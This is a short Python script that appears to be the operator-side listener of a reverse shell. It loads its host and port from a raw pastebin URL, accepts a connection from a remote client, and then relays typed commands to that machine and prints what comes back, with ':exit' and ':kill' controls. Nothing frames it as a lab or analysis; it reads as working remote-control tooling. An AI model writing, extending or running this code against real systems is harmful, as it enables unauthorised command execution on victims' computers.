import socket, json
from urllib.request import urlopen

CONFIG = json.loads(urlopen("https://pastebin.com/raw/0TfqFbEn").read())

HOST = CONFIG['host']
PORT = int(CONFIG['port'])

s = socket.socket()
s.bind((HOST,PORT))
s.listen(1)

print(f'[.] Listening to {HOST}:{PORT}')

client, a = s.accept()

print('[!] Client Connected', end='\n\n')
print('==================================')
print(':exit = Terminate Connection')
print(':kill = Terminate Client Script')
print('==================================', end='\n\n')

while True:	
	command = input('>> ')
	if len(command):
		if command in [':exit', ':kill']:
			client.send(command.encode('utf-8'))
			break
		else:
			try:
				client.send(command.encode('utf-8'))
				output = client.recv(99999).decode()
				print(output)
			except socket.error as error:
				print(f'[-] {error}')
				break
			except socket.timeout:
				print('[-] Connection Timed Out')
				break

print('[!] Connection Closed')